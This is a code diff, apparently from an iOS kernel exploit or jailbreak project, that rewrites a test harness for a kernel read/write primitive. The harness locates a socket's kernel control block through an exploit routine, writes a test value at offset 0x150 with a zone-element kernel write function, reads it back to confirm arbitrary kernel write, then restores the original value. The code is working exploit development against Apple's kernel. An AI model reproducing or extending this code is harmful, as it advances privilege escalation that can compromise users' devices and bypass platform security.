@@ -711,34 +711,34 @@
     [[KPLog shared] append:@"[RESULT] KRW write test — запуск"];
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         NSMutableString *r = [NSMutableString string];
-        [r appendString:@"\n=== KRW write test (no Glyph, clean heap) ===\n"];
+        [r appendString:@"\n=== KRW write test (kwrite_zone_element_qword) ===\n"];
         extern uint64_t darksword_rw_socket_pcb(void);
-        extern void krw_zone_write_block(uint64_t where, const uint8_t *buf);
+        extern uint64_t early_kread64(uint64_t where);
+        extern krw_zone_verdict kwrite_zone_element_qword(uint64_t dst, uint64_t value,
+                                                          uint64_t objBase, uint64_t objSize);
         uint64_t pcb = darksword_rw_socket_pcb();
-        if (pcb && gPrimitives.kreadbuf) {
+        if (pcb) {
             [r appendFormat:@"  darksword pcb = 0x%016llx\n", pcb];
-            uint8_t orig[32] = {0};
-            gPrimitives.kreadbuf(pcb + 0x150, orig, 32);
-            [r appendFormat:@"  pcb+0x150 read: %02x %02x %02x %02x %02x %02x %02x %02x\n",
-                orig[0], orig[1], orig[2], orig[3], orig[4], orig[5], orig[6], orig[7]];
-            uint8_t testBlock[32];
-            memset(testBlock, 0x41, 32);
-            *(uint64_t *)testBlock = 0x1122334455667788ULL;
-            krw_zone_write_block(pcb + 0x150, testBlock);
-            uint8_t readBack[32] = {0};
-            gPrimitives.kreadbuf(pcb + 0x150, readBack, 32);
-            [r appendFormat:@"  pcb+0x150 readback: %02x %02x %02x %02x %02x %02x %02x %02x (expect 88 77 66 55)\n",
-                readBack[0], readBack[1], readBack[2], readBack[3], readBack[4], readBack[5], readBack[6], readBack[7]];
-            if (*(uint64_t *)readBack == 0x1122334455667788ULL) {
-                [r appendString:@"  >>> KRW WRITE VERIFIED via krw_zone_write_block!\n"];
+            uint64_t chksumAddr = pcb + 0x150;  // inp6_chksum
+            uint64_t orig = early_kread64(chksumAddr);
+            [r appendFormat:@"  pcb+0x150 read: 0x%016llx\n", orig];
+            uint64_t testVal = 0x1122334455667788ULL;
+            // Use kwrite_zone_element_qword with pcb as objBase and 0x200 as window
+            krw_zone_verdict v = kwrite_zone_element_qword(chksumAddr, testVal, pcb, 0x200);
+            [r appendFormat:@"  write verdict=%d\n", (int)v];
+            uint64_t readBack = early_kread64(chksumAddr);
+            [r appendFormat:@"  pcb+0x150 readback: 0x%016llx (expect 0x%016llx)\n", readBack, testVal];
+            if (readBack == testVal) {
+                [r appendString:@"  >>> KRW WRITE VERIFIED via kwrite_zone_element_qword!\n"];
                 [r appendString:@"  >>> type 0x21 path confirmed — proc is writable\n"];
             } else {
                 [r appendString:@"  >>> KRW write did not persist\n"];
             }
-            krw_zone_write_block(pcb + 0x150, orig);
-            [r appendString:@"  restored original block\n"];
+            // Restore
+            kwrite_zone_element_qword(chksumAddr, orig, pcb, 0x200);
+            [r appendString:@"  restored original value\n"];
         } else {
-            [r appendString:@"  darksword pcb or kreadbuf not available — run pe_v1 first\n"];
+            [r appendString:@"  darksword pcb not available — run pe_v1 first\n"];
         }
         dispatch_async(dispatch_get_main_queue(), ^{
             [[KPLog shared] append:r];
